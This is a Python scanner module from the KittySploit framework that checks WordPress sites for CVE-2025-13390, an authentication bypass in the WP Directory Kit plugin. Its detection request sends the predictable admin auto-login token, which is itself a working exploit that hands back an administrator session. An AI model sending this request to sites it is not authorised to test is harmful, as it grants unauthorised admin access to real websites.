#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The WP Directory Kit plugin for WordPress version 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WP Directory Kit <= 1.4.4 - Authentication Bypass Detection',
        'description': 'The WP Directory Kit plugin for WordPress version 1.4.4 and below contains an authentication bypass vulnerability in its auto-login functionality. The vulnerability allows unauthenticated attackers to gain administrative access by exploiting a cryptographically weak token generation mechanism that uses only the first 10 characters of MD5(user_id). For user_id=1 (typically admin), the token is always predictable.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'wordpress', 'wp', 'wp-plugin', 'auth-bypass', 'wpdirectorykit', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://plugins.trac.wordpress.org/browser/wpdirectorykit/trunk/actions.php#L116',
            'https://ryankozak.com/posts/cve-2025-13390/',
            'https://github.com/d0n601/CVE-2025-13390',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-13390',
        ],
        'cve': 'CVE-2025-13390',
    }

    def run(self):
        path = '/?auto-login=1&user_id=1&token=c4ca4238a0'
        r = self.http_request(method='GET', path=path, allow_redirects=True, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        if not r or r.status_code != 302:
            return False
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items()).lower()
        header_any = ('wordpress_logged_in_', 'set-cookie',)
        if any(m in headers for m in header_any):
            self.set_info(severity='critical', reason='WP Directory Kit <= 1.4.4 - Authentication Bypass detected', path=path)
            return True
        return False

